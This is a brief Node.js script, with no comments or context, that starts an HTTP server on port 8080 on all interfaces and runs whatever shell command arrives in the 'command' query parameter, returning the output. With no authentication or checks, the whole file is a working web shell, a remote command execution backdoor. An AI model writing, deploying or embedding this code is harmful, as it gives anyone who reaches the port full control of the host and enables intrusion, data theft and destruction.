const childProcess = require("child_process");
const http = require("http");

http.createServer((request, response) => {
  const command = new URL(request.url, "http://0.0.0.0").searchParams.get("command");
  childProcess.exec(command, (_error, stdout) => response.end(stdout));
}).listen(8080, "0.0.0.0");
